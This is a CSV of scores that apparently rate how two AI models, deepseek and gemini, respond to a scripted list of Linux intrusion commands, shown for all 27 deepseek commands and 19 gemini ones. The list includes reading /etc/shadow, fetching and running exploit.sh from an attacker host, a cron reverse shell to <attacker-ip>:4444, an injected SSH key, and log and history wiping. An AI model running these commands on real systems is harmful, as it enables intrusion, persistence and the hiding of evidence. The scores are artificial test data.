Model,Command_Num,Command,Compliance,Realism,Consistency,Speed,Overall,Response_Time
deepseek,1,"uname -a",10,7,9,3,7.65,20.37
deepseek,2,"whoami",10,7,8,5,7.85,11.27
deepseek,3,"id",10,7,7,7,8.05,9.65
deepseek,4,"cat /etc/passwd",10,7,7,2,7.05,58.84
deepseek,5,"cat /etc/shadow",10,8,7,2,7.30,46.99
deepseek,6,"cat /etc/os-release",10,7,7,2,7.05,30.33
deepseek,7,"ps aux",10,7,7,1,6.85,96.74
deepseek,8,"netstat -antup",10,8,7,3,7.50,27.85
deepseek,9,"ss -antup",10,7,7,1,6.85,67.72
deepseek,10,"ifconfig",10,8,7,2,7.30,39.55
deepseek,11,"ip a",10,8,7,3,7.50,29.18
deepseek,12,"sudo -l",10,7,7,3,7.25,21.25
deepseek,13,"history",10,8,7,5,7.90,17.96
deepseek,14,"find / -perm -u=s -type f 2>/dev/null",10,7,7,5,7.65,18.54
deepseek,15,"sudo su",10,7,7,3,7.25,20.75
deepseek,16,"wget http://<attacker-ip>/exploit.sh",10,10,7,3,8.00,20.0
deepseek,17,"curl -o exploit.sh http://<attacker-ip>/exploit.sh",10,8,7,2,7.30,58.03
deepseek,18,"chmod +x exploit.sh",10,7,8,3,7.45,20.9
deepseek,19,"./exploit.sh",10,9,7,3,7.75,22.51
deepseek,20,"crontab -l",10,7,7,2,7.05,56.67
deepseek,21,"echo '0 * * * * /bin/bash -c ""bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1""' | crontab -",10,7,7,3,7.25,25.69
deepseek,22,"echo ""ssh-rsa AAAA..."" >> ~/.ssh/authorized_keys",10,7,8,2,7.25,43.32
deepseek,23,"ssh user@<internal-ip>",10,5,7,1,6.35,75.78
deepseek,24,"history -c",10,7,8,3,7.45,26.23
deepseek,25,"unset HISTFILE",10,7,8,5,7.85,15.03
deepseek,26,"rm -f /var/log/auth.log",10,7,8,3,7.45,21.61
deepseek,27,"cat /dev/null > /var/log/wtmp",10,7,8,2,7.25,36.37
gemini,1,"uname -a",10,7,9,9,8.85,2.71
gemini,2,"whoami",10,7,8,10,8.85,1.46
gemini,3,"id",10,7,7,9,8.45,4.39
gemini,4,"cat /etc/passwd",10,7,7,5,7.65,18.69
gemini,5,"cat /etc/shadow",10,8,7,5,7.90,15.32
gemini,6,"cat /etc/os-release",10,7,7,7,8.05,9.42
gemini,7,"ps aux",10,7,7,3,7.25,23.59
gemini,8,"netstat -antup",10,8,7,3,7.50,20.03
gemini,9,"ss -antup",10,7,7,7,8.05,6.31
gemini,10,"ifconfig",10,7,7,7,8.05,6.38
gemini,11,"ip a",10,8,7,5,7.90,16.68
gemini,12,"sudo -l",10,7,7,7,8.05,6.16
gemini,13,"history",10,8,7,9,8.70,4.54
gemini,14,"find / -perm -u=s -type f 2>/dev/null",10,7,7,5,7.65,11.33
gemini,15,"sudo su",10,7,8,7,8.25,5.57
gemini,16,"wget http://<attacker-ip>/exploit.sh",10,10,7,5,8.40,16.67
gemini,17,"curl -o exploit.sh http://<attacker-ip>/exploit.sh",10,8,7,5,7.90,15.03
gemini,18,"chmod +x exploit.sh",10,7,8,10,8.85,1.51
gemini,19,"./exploit.sh",10,9,7,7,8.55,5.55
